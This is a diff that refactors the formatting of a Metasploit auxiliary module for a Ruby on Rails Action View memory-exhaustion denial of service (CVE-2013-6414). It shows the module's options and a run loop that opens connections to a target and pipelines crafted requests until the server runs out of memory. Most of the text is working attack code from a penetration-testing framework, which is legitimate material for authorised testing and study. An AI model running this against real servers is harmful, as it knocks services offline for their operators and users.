@@ -8,47 +8,54 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Ruby on Rails Action View MIME Memory Exhaustion',
-      'Description'    => %q{
-        This module exploits a Denial of Service (DoS) condition in Action View that requires
-        a controller action. By sending a specially crafted content-type header to a Rails
-        application, it is possible for it to store the invalid MIME type, and may eventually
-        consume all memory if enough invalid MIMEs are given.
+    super(
+      update_info(
+        info,
+        'Name' => 'Ruby on Rails Action View MIME Memory Exhaustion',
+        'Description' => %q{
+          This module exploits a Denial of Service (DoS) condition in Action View that requires
+          a controller action. By sending a specially crafted content-type header to a Rails
+          application, it is possible for it to store the invalid MIME type, and may eventually
+          consume all memory if enough invalid MIMEs are given.
 
-        Versions 3.0.0 and other later versions are affected, fixed in 4.0.2 and 3.2.16.
-      },
-      'Author'         =>
-        [
+          Versions 3.0.0 and other later versions are affected, fixed in 4.0.2 and 3.2.16.
+        },
+        'Author' => [
           'Toby Hsieh', # Reported the issue
           'joev',       # Metasploit
           'sinn3r'      # Metasploit
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2013-6414' ],
           [ 'OSVDB', '100525' ],
           [ 'BID', '64074' ],
           [ 'URL', 'https://seclists.org/oss-sec/2013/q4/400' ],
           [ 'URL', 'https://github.com/rails/rails/commit/bee3b7f9371d1e2ddcfe6eaff5dcb26c0a248068' ]
         ],
-      'DisclosureDate' => '2013-12-04'))
+        'DisclosureDate' => '2013-12-04',
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(80),
-        OptString.new('URIPATH',     [true, 'The URI that routes to a Rails controller action', '/']),
-        OptInt.new('MAXSTRINGSIZE',  [true, 'Max string size', 60000]),
-        OptInt.new('REQCOUNT',       [true, 'Number of HTTP requests to pipeline per connection', 1]),
-        OptInt.new('RLIMIT',         [true, 'Number of requests to send', 100000])
-      ],
-    self.class)
+        OptString.new('URIPATH', [true, 'The URI that routes to a Rails controller action', '/']),
+        OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 60_000]),
+        OptInt.new('REQCOUNT', [true, 'Number of HTTP requests to pipeline per connection', 1]),
+        OptInt.new('RLIMIT', [true, 'Number of requests to send', 100_000])
+      ]
+    )
   end
 
   def host
     host = datastore['RHOST']
-    host += ":" + datastore['RPORT'].to_s if datastore['RPORT'] != 80
+    host += ':' + datastore['RPORT'].to_s if datastore['RPORT'] != 80
     host
   end
 
@@ -62,12 +69,12 @@ class MetasploitModule < Msf::Auxiliary
   # 2. Removes all the double slashes
   #
   def normalize_uri(*strs)
-    new_str = strs * "/"
+    new_str = strs * '/'
 
-    new_str = new_str.gsub!("//", "/") while new_str.index("//")
+    new_str = new_str.gsub!('//', '/') while new_str.index('//')
 
     # Makes sure there's a starting slash
-    unless new_str.start_with?("/")
+    unless new_str.start_with?('/')
       new_str = '/' + new_str
     end
 
@@ -87,22 +94,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    begin
-      print_status("Stressing the target memory, this will take quite some time...")
-      datastore['RLIMIT'].times { |i|
-        connect
-        datastore['REQCOUNT'].times { sock.put(http_request) }
-        disconnect
-      }
-
-      print_status("Attack finished. Either the server isn't vulnerable, or please dos harder.")
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-      print_status("Unable to connect to #{host}.")
-    rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
-      print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached.")
-    ensure
+    print_status('Stressing the target memory, this will take quite some time...')
+    datastore['RLIMIT'].times do |_i|
+      connect
+      datastore['REQCOUNT'].times { sock.put(http_request) }
       disconnect
     end
+
+    print_status("Attack finished. Either the server isn't vulnerable, or please dos harder.")
+  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+    print_status("Unable to connect to #{host}.")
+  rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
+    print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached.")
+  ensure
+    disconnect
   end
 end
 
